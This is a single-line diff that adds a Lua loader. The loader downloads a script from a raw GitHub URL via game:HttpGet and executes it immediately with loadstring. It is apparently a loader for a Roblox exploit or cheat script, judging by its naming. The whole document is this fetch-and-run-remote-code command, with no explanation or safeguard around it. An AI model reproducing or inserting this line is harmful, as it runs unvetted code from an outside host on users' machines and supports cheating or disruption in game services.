@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/hm-corruption-megamind-drop-crazy-skelet-spam2-8bhpfhy3jrf0kk.lua"))()
